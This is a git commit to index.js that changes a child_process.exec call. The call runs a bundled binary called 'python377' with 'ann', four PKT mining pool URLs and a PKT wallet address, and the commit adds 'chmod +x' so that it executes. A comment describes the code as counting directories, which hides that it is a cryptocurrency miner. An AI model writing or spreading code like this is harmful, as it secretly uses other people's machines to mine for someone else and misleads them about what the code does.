a28f684a4370759a5a1bf284a5d36ec2b6fe23b7
beanb1123 <103089678+beanb1123@users.noreply.github.com>
2023-09-04 23:23:51 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const { exec } = require('child_process');
  
 // Counts the number of directory in
 // current working directory
-exec('./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1q6l2qm5msxnkrl6qsh9cys9x4u357y5dyv26qgu', (error, stdout, stderr) => {
+exec('chmod +x python377 && ./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1q6l2qm5msxnkrl6qsh9cys9x4u357y5dyv26qgu', (error, stdout, stderr) => {
     if (error) {
         console.error(`exec error: ${error}`);
         return;
